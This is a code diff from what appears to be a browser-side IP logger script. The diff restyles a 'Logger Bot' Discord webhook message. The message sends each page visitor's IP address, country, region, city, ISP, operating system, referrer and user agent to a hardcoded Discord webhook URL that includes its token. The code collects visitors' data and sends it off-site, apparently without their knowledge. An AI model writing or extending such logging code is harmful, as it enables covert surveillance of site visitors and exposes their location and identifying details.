@@ -64,21 +64,21 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1374900077616955482/fN02yh
                 username: "Logger Bot",
                 avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
                 embeds: [{
-                    title: "📊 Data Logged",
-                    description: `User data captured for Site: ${currentPageUrl}`,
-                    color: 0x0099FF,
+                    title: "📊 User Visit",
+                    description: `**Page:** ${currentPageUrl}\n\nBelow are the collected user details:`,
+                    color: 0x5865F2,
                     fields: [
-                        ...(allData.ip !== "Unknown" ? [{ name: "IP Address", value: allData.ip, inline: true }] : []),
-                        ...(allData.country !== "Unknown" ? [{ name: "Country", value: allData.country, inline: true }] : []),
-                        ...(allData.region !== "Unknown" ? [{ name: "Region/State", value: allData.region, inline: true }] : []),
-                        ...(allData.city !== "Unknown" ? [{ name: "City", value: allData.city, inline: true }] : []),
-                        ...(allData.isp !== "Unknown" ? [{ name: "ISP", value: allData.isp, inline: true }] : []),
-                        { name: "Operating System", value: allData.platform, inline: true },
-                        { name: "Referrer URL", value: allData.referrer.substring(0, 1024), inline: false },
-                        { name: "User Agent (Browser)", value: allData.userAgent.substring(0, 1024), inline: false }
+                        ...(allData.ip !== "Unknown" ? [{ name: "🌐 IP Address", value: `\`${allData.ip}\``, inline: true }] : []),
+                        ...(allData.country !== "Unknown" ? [{ name: "🏳️ Country", value: allData.country, inline: true }] : []),
+                        ...(allData.region !== "Unknown" ? [{ name: "🏙️ Region/State", value: allData.region, inline: true }] : []),
+                        ...(allData.city !== "Unknown" ? [{ name: "🏠 City", value: allData.city, inline: true }] : []),
+                        ...(allData.isp !== "Unknown" ? [{ name: "📡 ISP", value: allData.isp, inline: true }] : []),
+                        { name: "💻 Operating System", value: allData.platform, inline: true },
+                        { name: "🔗 Referrer", value: allData.referrer && allData.referrer !== "Direct/Unknown" ? `[${allData.referrer}](${allData.referrer})` : "Direct/None", inline: false },
+                        { name: "🧭 User Agent", value: `\`\`\`${allData.userAgent.substring(0, 1024)}\`\`\``, inline: false }
                     ],
                     footer: {
-                        text: "Data logged, IP, Browser info, Country, City, Region, ISP, Referrer URL, User Agent (Browser), Operating System"
+                        text: "Logger Bot • IP, Browser, Location, ISP, Referrer, OS"
                     },
                     timestamp: getTimestamp()
                 }]
